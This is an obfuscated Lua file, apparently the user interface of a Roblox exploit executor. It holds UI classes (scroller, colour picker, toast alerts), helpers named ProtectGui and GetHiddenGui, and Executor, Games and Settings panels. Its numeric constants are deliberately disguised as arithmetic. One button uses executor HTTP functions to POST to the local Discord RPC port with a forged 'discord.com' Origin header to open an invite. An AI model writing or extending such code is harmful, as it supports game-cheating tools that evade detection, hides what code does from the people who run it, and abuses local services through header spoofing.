			v2274.ClipsDescendants = true;
			v2272.Changed:Connect(function(v2606)
				if (v2606 == "Size") then
					v2268.Redraw(v2264, "StepSize");
				end
			end);
			v2267.__Instance = v2272;
			v2267.__Base2D = v2272;
			v2267.__Background = v2274;
			v2267.Grip = v2273;
			local v2294 = function()
				local v2607 = 0;
				local v2608;
				local v2609;
				local v2610;
				while true do
					if (v2607 == 2) then
						v2273.AnchorPoint = Vector2.new(1366 - (205 + 1160), v2610);
						break;
					end
					if (1 == v2607) then
						v2273.Position = UDim2.new(1 + 0, 0 + 0, 1305 - (535 + 770), v2609);
						v2610 = tostring((v2609 / v2608) * (7 + 93)) / (55 + 45);
						v2607 = 1996 - (211 + 1783);
					end
					if (v2607 == (0 + 0)) then
						v2608 = v2268.GetFullSize(v2264);
						v2609 = v1359.Map(v2268.Layer, 1429 - (1236 + 193), v2268.MaxLayer, 910 - (793 + 117), v2608);
						v2607 = 1;
					end
				end
			end;
			v2272.MouseWheelForward:Connect(function()
				if v2268.CanScroll then
					local v3070 = 0;
					while true do
						if (v3070 == (1892 - (1607 + 285))) then
							if (v2268.Layer <= (860 - (747 + 113))) then
								local v3503 = 0;
								while true do
									if (v3503 == (1976 - (80 + 1896))) then
										v1338:Create(v2274, v2268.ScrollTweenInfo, {Position=UDim2.new(0.5, 0 - 0, 0 - 0, (-v2268.Layer * v2268.StepSize) + v2268.StepSize)}):Play();
										wait(v2268.ScrollTweenInfo.Time);
										break;
									end
								end
							elseif (v2268.Layer > (0 + 0)) then
								local v3557 = 0;
								while true do
									if ((0 - 0) == v3557) then
										v2267.Travelling:Fire();
										v2268.IsTravelling = true;
										v3557 = 1 + 0;
									end
									if (v3557 == (5 - 3)) then
										if (v2268.Layer <= (0 + 0)) then
											local v3584 = 0;
											while true do
												if (v3584 == (1 + 0)) then
													v2268.IsTravelling = false;
													v2267.TopTouched:Fire();
													break;
												end
												if (v3584 == 0) then
													v2268.OnBottom = false;
													v2268.OnTop = true;
													v3584 = 2 - 1;
												end
											end
										end
										break;
									end
									if (v3557 == 1) then
										v2268.OnTop = false;
										v2268.Layer = v2268.Layer - v2268.Step;
										v3557 = 2;
									end
								end
							end
							v1338:Create(v2274, v2268.ScrollTweenInfo, {Position=UDim2.new(0.5, 454 - (246 + 208), 1892 - (614 + 1278), -v2268.Layer * v2268.StepSize)}):Play();
							v3070 = 1;
						end
						if (v3070 == (1 + 0)) then
							v2294();
							break;
						end
					end
				end
			end);
			v2272.MouseWheelBackward:Connect(function()
				if v2268.CanScroll then
					if (v2268.Layer >= v2268.MaxLayer) then
						local v3335 = 314 - (249 + 65);
						while true do
							if ((0 - 0) == v3335) then
								v1338:Create(v2274, v2268.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 1275 - (726 + 549), (-v2268.Layer * v2268.StepSize) - v2268.StepSize)}):Play();
								wait(v2268.ScrollTweenInfo.Time);
								break;
							end
						end
					else
						v2267.Travelling:Fire();
						v2268.IsTravelling = true;
						v2268.OnBottom = false;
						v2268.Layer = v2268.Layer + v2268.Step;
						if (v2268.Layer >= v2268.MaxLayer) then
							local v3478 = 0 + 0;
							while true do
								if (v3478 == 1) then
									v2268.IsTravelling = false;
									v2267.BottomTouched:Fire();
									break;
								end
								if (v3478 == 0) then
									v2268.OnBottom = true;
									v2268.OnTop = false;
									v3478 = 1425 - (916 + 508);
								end
							end
						end
					end
					v1338:Create(v2274, v2268.ScrollTweenInfo, {Position=UDim2.new(0.5 - 0, 0, 0 + 0, -v2268.Layer * v2268.StepSize)}):Play();
					v2294();
				end
			end);
			v2268.Redraw(v2264);
			return v2264;
		end, function(v2295)
			v2295['GripVisible'] = function(v2611, v2612)
				v2611.Grip.Visible = v2612.GripVisible;
				v2611.Grip.Size = UDim2.new(0, v2612.GripSize, 323 - (140 + 183), v2611.Grip.Size.Y.Offset);
			end;
			v2295['GripSize'] = v2295['GripVisible'];
			v2295['MaxLayer'] = function(v2616, v2617)
				local v2618 = 0;
				local v2619;
				local v2620;
				while true do
					if (v2618 == 0) then
						v2619 = v2617.GetFullSize(v2616.__Proxy);
						v2620 = v2617.GetVisibleLayers(v2616.__Proxy, v2619);
						v2618 = 1 + 0;
					end
					if (v2618 == (565 - (297 + 267))) then
						v2616.Grip.Size = UDim2.new(0 + 0, v2617.GripSize, 0, v2619 / v2620);
						break;
					end
				end
			end;
			v2295['StepSize'] = v2295['MaxLayer'];
			v2295['GripColor'] = function(v2621, v2622)
				v2621.Grip.BackgroundColor3 = v2622.GripColor;
			end;
		end, {GetFullSize=function(v2301)
			local v2302 = 342 - (37 + 305);
			local v2303;
			local v2304;
			local v2305;
			while true do
				if (v2302 == 0) then
					v2303 = v1334(v2301);
					v2304 = v2303.__Fields;
					v2302 = 1;
				end
				if ((1267 - (323 + 943)) == v2302) then
					v2305 = v2303.__Instance;
					return v2305.AbsoluteSize.Y;
				end
			end
		end,GetVisibleLayers=function(v2306)
			local v2307 = v1334(v2306);
			local v2308 = v2307.__Fields;
			local v2309 = v2307.__Instance;
			return math.floor(v2309.AbsoluteSize.Y / v2308.StepSize);
		end,Scroll=function(v2310, v2311)
			local v2312 = 0;
			local v2313;
			local v2314;
			while true do
				if (v2312 == (0 + 0)) then
					v2313 = v1334(v2310);
					v2314 = v2313.__Fields;
					break;
				end
			end
		end,Reset=function(v2315)
			local v2316 = 0 - 0;
			local v2317;
			local v2318;
			local v2319;
			while true do
				if (v2316 == 2) then
					v1338:Create(v2319, v2318.ScrollTweenInfo, {Position=UDim2.new(1535.5 - (394 + 1141), 0, 0, v2318.Layer * v2318.StepSize)}):Play();
					break;
				end
				if ((0 + 0) == v2316) then
					v2317 = v1334(v2315);
					v2318 = v2317.__Fields;
					v2316 = 1;
				end
				if ((1 + 0) == v2316) then
					v2319 = v2317.__Background;
					v2318.Layer = 0;
					v2316 = 1 + 1;
				end
			end
		end});
		v1363("ColorPicker", {Size={"\4\0\0Vector2",Vector2.new(200, 130)},PointerSize={"\3\0\0number",(19 + 1)},BottomPadding={"\3\0\0number",(825 - (13 + 792))},ValueDragging={"\3\0\1boolean",false},Dragging={"\3\0\1boolean",false},BorderDistance={"\3\0\0number",(1870 - (1231 + 634))},IsOpen={"\3\0\1boolean",false},Color={"\4\0\0Color3"},SecondaryColor={"\4\0\0Color3",v1358.DimMidnightBlue},TextColor={"\4\0\0Color3",Color3.new(1 + 0, 1951 - (1111 + 839), 952 - (496 + 455))},ColorChanged={"\4\0\1Event"}}, {Value="Color",ValueChanged="ColorChanged"}, function(v2320, v2321, v2322)
			local v2323 = v1334(v2320);
			local v2324 = v2323.__Fields;
			v2324.Color = ((typeof(v2322) == "Color3") and v2322) or Color3.new(1, 1 - 0, 1);
			local v2326 = Instance.new("Frame", v2321);
			local v2327 = Instance.new("Frame", v2326);
			local v2328 = Instance.new("ImageButton", v2327);
			local v2329 = Instance.new("ImageLabel", v2328);
			local v2330 = Instance.new("ImageButton", v2327);
			local v2331 = Instance.new("Frame", v2330);
			local v2332 = Instance.new("TextLabel", v2327);
			v2326.Name = v1335 .. "ColorPicker";
			v2326.BorderColor3 = Color3.fromRGB(1391 - (441 + 695), 255, 255);
			v2326.BackgroundTransparency = 2 - 1;
			v2326.ClipsDescendants = true;
			v2327.Name = v1335 .. "Container";
			v2327.AnchorPoint = Vector2.new(0 - 0, 0);
			v2328.Name = v1335 .. "Canvas";
			v2328.Image = "rbxassetid://4018903152";
			v2328.ClipsDescendants = true;
			v2328.BackgroundTransparency = 1;
			v2328.Active = true;
			v2329.Name = v1335 .. "Pointer";
			v2329.Image = "rbxassetid://4019495410";
			v2329.AnchorPoint = Vector2.new(0.5 - 0, 0.5);
			v2329.BackgroundTransparency = 1;
			v2330.Name = v1335 .. "ValueCanvas";
			v2330.BorderSizePixel = 0 + 0;
			v2330.Image = "rbxassetid://4019265005";
			v2330.AnchorPoint = Vector2.new(1839 - (286 + 1552), 1277 - (1016 + 261));
			v2330.BackgroundTransparency = 1;
			v2331.Name = v1335 .. "ValuePointer";
			v2331.Size = UDim2.new(1, 1320 - (708 + 612), 0 - 0, 3 + 3);
			v2331.BorderSizePixel = 379 - (113 + 266);
			v2332.Name = v1335 .. "ColorInfo";
			v2332.Text = v2324.GetFormat(v2320);
			v2332.BackgroundTransparency = 1171 - (979 + 191);
			v2332.AnchorPoint = Vector2.new(0 - 0, 1);
			v2332.Position = UDim2.new(1735 - (339 + 1396), v2324.BorderDistance, 1 + 0, 0 + 0);
			v2332.TextXAlignment = Enum.TextXAlignment.Left;
			v2324.ColorChanged:Connect(function()
				v2332.Text = v2324.GetFormat(v2320);
			end);
			local v2363;
			local v2364;
			v1333.onDownUp(v2328, function()
				local v2626 = 0;
				while true do
					if ((0 - 0) == v2626) then
						v2324.Dragging = true;
						v2363 = v1351.Move:Connect(v2323.MoveClosure);
						break;
					end
				end
			end, function()
				v2324.Dragging = false;
				if v2363 then
					v2363:Disconnect();
				end
			end);
			v1333.onDownUp(v2330, function()
				v2324.ValueDragging = true;
				v2364 = v1351.Move:Connect(v2323.MoveClosure);
			end, function()
				v2324.ValueDragging = false;
				if v2364 then
					v2364:Disconnect();
				end
			end);
			v2323.MoveClosure = function(v2630)
				local v2631 = 0 + 0;
				while true do
					if (v2631 == (0 + 0)) then
						if v2324.Dragging then
							local v3429 = UDim2.new(math.clamp((v1351.X - v2328.AbsolutePosition.X) / v2328.AbsoluteSize.X, 347 - (187 + 160), 2 - 1), 0 - 0, math.clamp((v1351.Y - v2328.AbsolutePosition.Y) / v2328.AbsoluteSize.Y, 0, 1 + 0), 0);
							v1338:Create(v2329, v1333.tweenInfo.move, {Position=v3429}):Play();
							wait(v1333.tweenInfo.move.Time);
							v2324.SelectColor(v2320);
						end
						if v2324.ValueDragging then
							local v3430 = UDim2.new(0 - 0, 0 + 0, math.clamp((v1351.Y - v2330.AbsolutePosition.Y) / v2330.AbsoluteSize.Y, 0, 1 + 0), 0);
							local v3431 = Vector2.new(0, v2331.Position.Y.Scale);
							v1338:Create(v2331, v1333.tweenInfo.move, {Position=v3430,AnchorPoint=v3431}):Play();
							wait(v1333.tweenInfo.move.Time);
							v2324.SelectColor(v2320);
						end
						break;
					end
				end
			end;
			v2323.RainbowOffset = 0 - 0;
			v2323.__Instance = v2326;
			v2323.__Base2D = v2326;
			v2323.__ImageRender = v2329;
			v2323.ColorInfo = v2332;
			v2323.Canvas = v2328;
			v2323.Container = v2327;
			v2323.ValueCanvas = v2330;
			v2323.ValuePointer = v2331;
			v2324.Redraw(v2320);
			v2324.Close(v2320, true);
		end, function(v2375)
			v2375['Size'] = function(v2632, v2633)
				local v2634 = 328 - (56 + 272);
				while true do
					if (v2634 == (0 + 0)) then
						v2632.__Instance.Size = UDim2.new(0 + 0, v2633.IsOpen and v2633.Size.X, 0, v2633.Size.Y);
						v2632.Container.Size = UDim2.new(0 - 0, v2633.Size.X, 0 + 0, v2633.Size.Y);
						v2634 = 1;
					end
					if (v2634 == (641 - (455 + 185))) then
						v2632.__ImageRender.Size = UDim2.new(788 - (757 + 31), v2633.PointerSize, 1999 - (762 + 1237), v2633.PointerSize);
						v2632.__ImageRender.ImageColor3 = v2633.Color;
						v2634 = 3 - 1;
					end
					if (v2634 == (271 - (265 + 4))) then
						v2633.SelectColor(v2632.__Proxy, v2633.Color);
						break;
					end
				end
			end;
			v2375['PointerSize'] = v2375['Size'];
			v2375['BorderDistance'] = function(v2635, v2636)
				local v2637 = v2635.ValueCanvas;
				v2637.Position = UDim2.new(1, -v2636.BorderDistance, 0, v2636.BorderDistance);
				v2637.Size = UDim2.new(0, 26, 2 - 1, (-v2636.BorderDistance * (2 + 0)) - v2636.BottomPadding);
				v2635.Canvas.Position = UDim2.new(0, v2636.BorderDistance, 0 - 0, v2636.BorderDistance);
				v2635.Canvas.Size = UDim2.new(0, (v2636.Size.X - (v2636.BorderDistance * 3)) - v2637.Size.X.Offset, 2 - 1, v2637.Size.Y.Offset);
			end;
			v2375['BottomPadding'] = function(v2642, v2643)
				v2642.ColorInfo.Size = UDim2.new(1 + 0, 0, 0, v2643.BottomPadding);
			end;
			v2375['SecondaryColor'] = function(v2645, v2646)
				local v2647 = 0 - 0;
				while true do
					if ((0 - 0) == v2647) then
						v2645.Container.BackgroundColor3 = v2646.SecondaryColor;
						v2645.__ImageRender.ImageColor3 = v2646.SecondaryColor;
						v2647 = 1 - 0;
					end
					if (v2647 == (1735 - (1691 + 43))) then
						v2645.ValuePointer.BackgroundColor3 = v2646.SecondaryColor;
						break;
					end
				end
			end;
			v2375['TextColor'] = function(v2648, v2649)
				v2648.ColorInfo.TextColor3 = v2649.TextColor;
			end;
		end, {GetFormat=function(v2382)
			local v2383 = v1334(v2382);
			local v2384 = v2383.__Fields;
			local v2385 = v2384.Color;
			local v2386 = string.format("H: %.1f S: %.1f V: %.1f", v2385:ToHSV());
			return v2386;
		end,SelectColor=function(v2387, v2388)
			local v2389 = v1334(v2387);
			local v2390 = v2389.__Fields;
			local v2391 = v2389.__ImageRender;
			local v2392 = v2389.ValuePointer;
			local v2393 = v2389.ValueCanvas;
			local v2394, v2395, v2396;
			if (typeof(v2388) == "Color3") then
				local v2820 = 0;
				local v2821;
				while true do
					if (v2820 == (0 + 0)) then
						v2821 = Color3.new(v2821.R, v2821.G, v2821.B);
						v2394, v2395, v2396 = v2821:ToHSV();
						v2820 = 3 - 2;
					end
					if (v2820 == (1 + 2)) then
						v2389.ColorChanged:Fire(v2390.Color);
						break;
					end
					if (v2820 == (7 - 5)) then
						v2393.ImageColor3 = Color3.fromHSV(v2394, v2395, 177 - (127 + 49));
						v2390.Color = Color3.fromHSV(v2394, v2395, v2396);
						v2820 = 1683 - (281 + 1399);
					end
					if (1 == v2820) then
						v2391.Position = UDim2.new(v2394, 0, 1 - v2395, 1659 - (184 + 1475));
						v2392.Position = UDim2.new(0 - 0, 0 - 0, (2 - 1) - v2396, 0 + 0);
						v2820 = 2 + 0;
					end
				end
			else
				local v2822 = 1291 - (260 + 1031);
				while true do
					if (v2822 == (1179 - (313 + 864))) then
						v2390.Color = Color3.fromHSV(v2394, (693 - (655 + 37)) - v2395, (1 + 0) - v2396);
						v2389.ColorChanged:Fire(v2390.Color);
						break;
					end
					if (v2822 == 1) then
						v2396 = v2392.Position.Y.Scale;
						v2393.ImageColor3 = Color3.fromHSV(v2394, (1 - 0) - v2395, 2 - 1);
						v2822 = 2;
					end
					if (v2822 == (0 + 0)) then
						v2394 = v2391.Position.X.Scale;
						v2395 = v2391.Position.Y.Scale;
						v2822 = 1 + 0;
					end
				end
			end
		end,Open=function(v2397)
			local v2398 = v1334(v2397);
			local v2399 = v2398.__Fields;
			local v2400 = v2398.__Instance;
			if (v2399.IsOpen == false) then
				local v2823 = 0;
				while true do
					if (v2823 == (0 - 0)) then
						v2399.IsOpen = true;
						v1338:Create(v2400, v1333.tweenInfo.move, {Size=UDim2.new(770 - (383 + 387), v2399.Size.X, 0 + 0, v2399.Size.Y)}):Play();
						break;
					end
				end
			end
		end,Close=function(v2401, v2402)
			local v2403 = 0;
			local v2404;
			local v2405;
			local v2406;
			local v2407;
			while true do
				if (v2403 == 0) then
					v2404 = v1334(v2401);
					v2405 = v2404.__Fields;
					v2403 = 1 + 0;
				end
				if (v2403 == 1) then
					v2406 = v2404.__Instance;
					v2407 = v2404.MoveConnection;
					v2403 = 2;
				end
				if (v2403 == (6 - 4)) then
					if v2405.IsOpen then
						local v3349 = 0;
						while true do
							if ((1 + 0) == v3349) then
								if v2407 then
									v2407:Disconnect();
									v2404.MoveConnection = nil;
								end
								break;
							end
							if (v3349 == (0 + 0)) then
								v2405.IsOpen = false;
								v1338:Create(v2406, v1333.tweenInfo.move, {Size=UDim2.new(0, 0, 0, v2405.Size.Y)}):Play();
								v3349 = 511 - (304 + 206);
							end
						end
					end
					break;
				end
			end
		end});
	end
	do
		local v1629 = 231 - (182 + 43);
		local v1630 = 20;
		local v1631 = TweenInfo.new(775.2 - (264 + 511), Enum.EasingStyle.Linear, Enum.EasingDirection.In);
		local v1632 = TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out);
		local v1633 = 1 + 1;
		local v1634 = Color3.new(2 - 1, 982 - (128 + 853), 1703 - (1635 + 67));
		local v1635 = v1358.DimMidnightBlue;
		local v1636 = {};
		local v1637 = {};
		local v1638 = {};
		local v1639;
		do
			v1639 = Instance.new("ImageLabel");
			v1639.Name = v1335 .. "MagnoliaAlert";
			v1639.Image = "rbxassetid://3570695787";
			v1639.ScaleType = Enum.ScaleType.Slice;
			v1639.SliceScale = 0.12;
			v1639.SliceCenter = Rect.new(10 + 90, 100, 38 + 62, 297 - (131 + 66));
			v1639.Size = UDim2.new(0, 1193 - 853, 0 - 0, 25 + 45);
			v1639.AnchorPoint = Vector2.new(0 + 0, 1 - 0);
			v1639.Position = UDim2.new(1, 0 - 0, 1, -(1635 - (306 + 1299)));
			v1639.BorderSizePixel = 0 + 0;
			v1639.BackgroundTransparency = 2 - 1;
			local v2419 = v1639:Clone();
			v2419.Name = "Underline";
			v2419.Parent = v1639;
			v2419.AnchorPoint = Vector2.new(789.5 - (671 + 118), 3 - 2);
			v2419.Position = UDim2.new(0.5, 76 - (73 + 3), 2 - 1, 0 - 0);
			v2419.Size = UDim2.new(0, 0, 0.06 - 0, 1755 - (1668 + 87));
			v2419.Rotation = 16 + 164;
			v2419.ImageRectSize = Vector2.new(200, 2019 - (296 + 1603));
		end
		function v1370(v2427, v2428)
			local v2429 = v2428.Title;
			local v2430 = v2428.Text or "None";
			local v2431 = v2428.Icon;
			local v2432 = v2428.Duration or v1633;
			local v2433 = v2428.TextColor or v1634;
			local v2434 = v2428.BackgroundColor or v1635;
			local v2435 = v1636[v2427] or {};
			v1636[v2427] = v2435;
			local v2437 = v1639:Clone();
			local v2438 = v2437.Underline;
			local v2439 = v2435[#v2435] or v2437;
			v2437.Parent = v2427;
			v2435[#v2435 + (107 - (79 + 27))] = v2437;
			local v2442 = #v2435;
			v1637[v2437] = v2442;
			v2437.ImageColor3 = v2434;
			v2438.ImageColor3 = v2433;
			local v2446 = v1630;
			local v2447;
			if v2431 then
				v2447 = Instance.new("ImageLabel", v2437);
				v2447.BackgroundTransparency = 1;
				v2447.Image = v2431;
				v2447.Position = UDim2.new(0 + 0, v1630, 1007.5 - (700 + 307), 0 + 0);
				v2447.AnchorPoint = Vector2.new(1799 - (1477 + 322), 0.5 + 0);
				local v2828 = v2437.Size.Y.Offset - (v2447.Position.X.Offset * 2);
				v2447.Size = UDim2.new(0 - 0, v2828, 0 + 0, v2828);
				v2446 = (v1630 * 2) + v2828;
			end
			local v2448;
			local v2449 = (v2437.Size.X.Offset - v2446) - (v1630 / (6 - 4));
			if v2429 then
				local v2830 = 0 + 0;
				while true do
					if ((0 - 0) == v2830) then
						v2448 = Instance.new("TextLabel", v2437);
						v2448.BackgroundTransparency = 1;
						v2830 = 2 - 1;
					end
					if (v2830 == 2) then
						v2448.TextColor3 = v2433;
						v2448.TextSize = v2428.TitleSize or (7 + 6);
						v2830 = 3;
					end
					if ((2 - 1) == v2830) then
						v2448.TextXAlignment = Enum.TextXAlignment.Left;
						v2448.Text = v2429;
						v2830 = 2 - 0;
					end
					if (v2830 == (5 - 2)) then
						v2448.Size = UDim2.new(0, v2449, 0, v2448.TextSize);
						v2448.Position = UDim2.new(0, v2446, 1786 - (20 + 1766), v1630 - (9 - 4));
						break;
					end
				end
			end
			local v2450 = Instance.new("TextLabel", v2437);
			v2450.BackgroundTransparency = 1;
			v2450.TextXAlignment = Enum.TextXAlignment.Left;
			v2450.TextYAlignment = Enum.TextYAlignment.Top;
			v2450.TextWrapped = true;
			v2450.TextSize = v2428.TextSize or (819 - (88 + 721));
			v2450.TextColor3 = v2433;
			v2450.AnchorPoint = Vector2.new(0 + 0, 0 + 0);
			v2450.Text = v2430;
			if v2448 then
				local v2831 = -(v2450.TextSize + v1630);
				v2450.Size = UDim2.new(0, v2449, 0 + 0, (v2437.AbsoluteSize.Y + v2831) - v1630);
				v2450.Position = UDim2.new(0 + 0, v2446, 2 - 1, v2831);
			else
				v2450.TextYAlignment = Enum.TextYAlignment.Center;
				v2450.Size = UDim2.new(0, v2449, 1 - 0, -(v1630 * (439 - (93 + 344))));
				v2450.AnchorPoint = Vector2.new(1213 - (960 + 253), 0.5 + 0);
				v2450.Position = UDim2.new(0 - 0, v2446, 0.5 - 0, 0);
			end
			if v2447 then
				v2447.ImageColor3 = v1354.DarkerColor(v2433, 1416.2 - (74 + 1342));
			end
			if v2428.Sound then
				v2428.Sound:Play();
			end
			v2437.Position = UDim2.new(1 + 0, v2437.Size.X.Offset + v1629, 1, 0);
			v1338:Create(v2437, v1631, {Position=UDim2.new(1, -v2437.Size.X.Offset - v1629, 1, v2442 * -(v2437.Size.Y.Offset + v1629))}):Play();
			v2437.Changed:Connect(function(v2652)
				if (v2652 == "ImageTransparency") then
					local v3080 = 474 - (33 + 441);
					while true do
						if ((0 - 0) == v3080) then
							v2438.ImageTransparency = v2437.ImageTransparency;
							v2450.TextTransparency = v2437.ImageTransparency;
							v3080 = 1420 - (64 + 1355);
						end
						if (v3080 == 1) then
							if v2448 then
								v2448.TextTransparency = v2437.ImageTransparency;
							end
							if v2447 then
								v2447.ImageTransparency = v2437.ImageTransparency;
							end
							break;
						end
					end
				end
			end);
			local v2462 = v1338:Create(v2438, TweenInfo.new(v2432, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size=UDim2.new(0.97 - 0, 11 - (5 + 6), v2438.Size.Y.Scale, 0 + 0)});
			v2462:Play();
			spawn(function()
				v2462.Completed:Wait();
				v1338:Create(v2438, v1631, {Size=UDim2.new(0 + 0, 446 - (369 + 77), v2438.Size.Y.Scale, 0 + 0)}):Play();
				v1338:Create(v2437, v1631, {Size=UDim2.new(738 - (438 + 300), v2437.Size.X.Offset / (295.03 - (50 + 244)), 1201 - (95 + 1106), v2437.Size.Y.Offset / (1.03 - 0)),ImageTransparency=(0.1 - 0)}):Play();
				wait(1896.5 - (1741 + 155));
				local v2653 = v1338:Create(v2437, v1631, {Position=UDim2.new(2 - 1, v2437.Size.X.Offset + v1629, 1 - 0, v2437.Position.Y.Offset)});
				v2653:Play();
				v2653.Completed:Wait();
				local v2654 = v1637[v2437];
				v1637[v2437] = nil;
				table.remove(v2435, v2654);
				for v2840, v2841 in next, v2435 do
					v1637[v2841] = v2840;
					local v2841 = v2435[v2840];
					v1338:Create(v2841, v1632, {Position=UDim2.new(1 - 0, -v2841.Size.X.Offset - v1629, 1 + 0, v2840 * -(v2841.Size.Y.Offset + v1629))}):Play();
				end
				v2437:Destroy();
			end);
		end
	end
	local v1371 = {new=v1364,CreateClass=v1363,GetInstance=v1366,GetMeta=v1334,NewCanvas=v1367,GetHiddenGui=v1352,ProtectGui=v1353,Enum=v1355,IsEnum=v1357,IsMagnolia=v1365,ModernColors=v1358,Math=v1359,Utils=v1354,ToastAlert=v1370};
	return v1371;
end};
local function v1175()
	local v1372 = 0 + 0;
	local v1373;
	local v1374;
	local v1375;
	local v1376;
	local v1377;
	local v1378;
	local v1379;
	local v1380;
	local v1381;
	local v1382;
	local v1383;
	local v1384;
	while true do
		if (v1372 == (2 + 0)) then
			v1381 = v1378.modernColors.ElectricBlue;
			v1382 = v1380.ImageColor3;
			v1383 = v1374:Create(v1380, v1378.tweenInfo.hover, {ImageColor3=v1381});
			v1384 = v1374:Create(v1380, v1378.tweenInfo.hover, {ImageColor3=v1382});
			v1372 = 7 - 4;
		end
		if (v1372 == (7 - 4)) then
			v1379.MouseEnter:Connect(function()
				v1383:Play();
			end);
			v1379.MouseLeave:Connect(function()
				v1384:Play();
			end);
			v1379.MouseButton1Click:Connect(function()
				if not v1377 then
					warn("Exploit not supported. No HTTP found.");
					return;
				end
				v1377({Url="http://127.0.0.1:6463/rpc?v=1",Method="POST",Headers={["Content-Type"]="application/json",Origin="https://discord.com"},Body=v1375:JSONEncode({cmd="INVITE_BROWSER",nonce=v1375:GenerateGUID(false),args={code=v1376}})});
			end);
			break;
		end
		if (v1372 == (1778 - (1263 + 514))) then
			v1377 = (syn and syn.request) or http_request or function()
			end;
			v1378 = v1160(v1373.Parent.Parent.Parent.Parent.Parent.utils);
			v1379 = v1373.Parent.Hitbox;
			v1380 = v1373.Parent.ImageLabel;
			v1372 = 2;
		end
		if (v1372 == 0) then
			v1373 = v0["16"];
			v1374 = game:GetService("TweenService");
			v1375 = game:GetService("HttpService");
			v1376 = "xJHCqm84cW";
			v1372 = 1;
		end
	end
end
task.spawn(v1175);
local function v1176()
	local v1385 = v0["18"];
	local v1386 = v1385.Parent;
	local v1387 = v1385.Parent.Parent.Parent.Parent.BodyClipping.Executor.InnerBody.SourceBg.Source.ScrollingFrame.SourceBox;
	local v1388 = "%d\n——\n%d";
	v1387:GetPropertyChangedSignal("Text"):Connect(function()
		local v1640 = 497 - (73 + 424);
		local v1641;
		local v1642;
		while true do
			if (v1640 == (2 - 1)) then
				if (v1641 > (308 - (93 + 215))) then
					_, v1642 = v1387.Text:gsub("\n", "");
					v1642 += (3 - 2)
				end
				v1386.Text = v1388:format(v1641, v1642);
				break;
			end
			if (v1640 == (1935 - (1756 + 179))) then
				v1641 = #v1387.Text;
				v1642 = 1679 - (550 + 1129);
				v1640 = 108 - (57 + 50);
			end
		end
	end);
end
task.spawn(v1176);
local function v1177()
	local v1389 = v0["21"];
	local v1390 = game:GetService("TweenService");
	local v1391 = game:GetService("Players");
	local v1392 = v1391.LocalPlayer;
	local v1393 = v1160(v1389.Parent.Parent.Parent.utils);
	local v1394 = v1389.Parent.Top;
	local v1395 = v1394.bg;
	local v1396 = v1389.Parent.Parent.BodyClipping;
	local v1397 = {[v1394.HomeBtn]=v1396.Executor,[v1394.MenuBtn]=v1396.Games,[v1394.SettingsBtn]=v1396.Settings};
	local v1398;
	local v1399 = 649 - (30 + 599);
	local v1400 = 6 + 16;
	local function v1401(v1643)
		if v1398 then
			v1390:Create(v1398, v1393.tweenInfo.expand, {Size=UDim2.new(0, v1399, 0 - 0, v1399),ImageColor3=Color3.fromRGB(37, 37, 955 - (794 + 124))}):Play();
			v1397[v1398].Visible = false;
		end
		v1397[v1643].Visible = true;
		v1390:Create(v1643, v1393.tweenInfo.expand, {Size=UDim2.new(0 + 0, v1400, 0, v1400),ImageColor3=Color3.fromRGB(181, 25 + 156, 181)}):Play();
		v1390:Create(v1395, v1393.tweenInfo.move, {Position=v1643.Position}):Play();
		v1398 = v1643;
	end
	for v1645, v1646 in next, v1394:GetChildren() do
		if v1646:IsA("ImageLabel") then
			v1646.Hitbox.MouseButton1Click:Connect(function()
				v1401(v1646);
			end);
		end
	end
	v1401(v1394.HomeBtn);
end
task.spawn(v1177);
local function v1178()
	local v1402 = 0;
	local v1403;
	local v1404;
	local v1405;
	local v1406;
	local v1407;
	local v1408;
	local v1409;
	local v1410;
	local v1411;
	local v1412;
	local v1413;
	local v1414;
	while true do
		if (v1402 == 2) then
			v1411 = v1404:Create(v1406, v1405.tweenInfo.hover, {TextColor3=v1408,PlaceholderColor3=v1408});
			v1412 = v1404:Create(v1406, v1405.tweenInfo.hover, {TextColor3=v1409,PlaceholderColor3=v1409});
			v1413 = v1404:Create(v1403.Parent, v1405.tweenInfo.hover, {BorderColor3=v1408});
			v1414 = v1404:Create(v1403.Parent, v1405.tweenInfo.hover, {BorderColor3=v1410});
			v1402 = 5 - 2;
		end
		if (1 == v1402) then
			v1407 = v1403.Parent.Parent.Scripts;
			v1408 = v1405.modernColors.ElectricBlue;
			v1409 = v1406.PlaceholderColor3;
			v1410 = Color3.fromRGB(21, 1948 - (1299 + 628), 46 - 25);
			v1402 = 5 - 3;
		end
		if (v1402 == (0 + 0)) then
			v1403 = v0["3e"];
			v1404 = game:GetService("TweenService");
			v1405 = v1160(v1403.Parent.Parent.Parent.Parent.Parent.Parent.Parent.utils);
			v1406 = v1403.Parent.TextBox;
			v1402 = 2 - 1;
		end
		if ((1448 - (335 + 1110)) == v1402) then
			v1406.Focused:Connect(function()
				v1411:Play();
				v1413:Play();
			end);
			v1406.FocusLost:Connect(function()
				local v2844 = 0;
				while true do
					if ((0 + 0) == v2844) then
						v1412:Play();
						v1414:Play();
						break;
					end
				end
			end);
			v1406:GetPropertyChangedSignal("TextColor3"):Connect(function()
				v1403.Parent.ImageLabel.ImageColor3 = v1406.TextColor3;
			end);
			v1406:GetPropertyChangedSignal("Text"):Connect(function()
				local v2847 = 0;
				local v2848;
				while true do
					if (v2847 == (0 - 0)) then
						v2848 = v1406.Text:lower();
						for v3435, v3436 in next, v1407:GetChildren() do
							local v3437 = 0;
							while true do
								if (v3437 == 0) then
									if not v3436:IsA("ImageLabel") then
										continue;
									end
									if v3436.Name:lower():find(v2848) then
										v3436.Visible = true;
									else
										v3436.Visible = false;
									end
									break;
								end
							end
						end
						break;
					end
				end
			end);
			break;
		end
	end
end
task.spawn(v1178);
local function v1179()
	local v1415 = 0;
	local v1416;
	local v1417;
	local v1418;
	while true do
		if (v1415 == (0 - 0)) then
			v1416 = v0["45"];
			v1417 = v1416.Parent.Hitbox;
			v1415 = 333 - (268 + 64);
		end
		if (v1415 == (1 + 0)) then
			v1418 = v1160(v1416.Parent.Parent.Parent.Parent.Parent.Parent.Parent.editor);
			v1417.MouseButton1Click:Connect(v1418.clearCurrent);
			break;
		end
	end
end
task.spawn(v1179);
local function v1180()
	local v1419 = 1278 - (243 + 1035);
	local v1420;
	local v1421;
	local v1422;
	while true do
		if (v1419 == (0 - 0)) then
			v1420 = v0["4a"];
			v1421 = v1420.Parent.Hitbox;
			v1419 = 4 - 3;
		end
		if ((4 - 3) == v1419) then
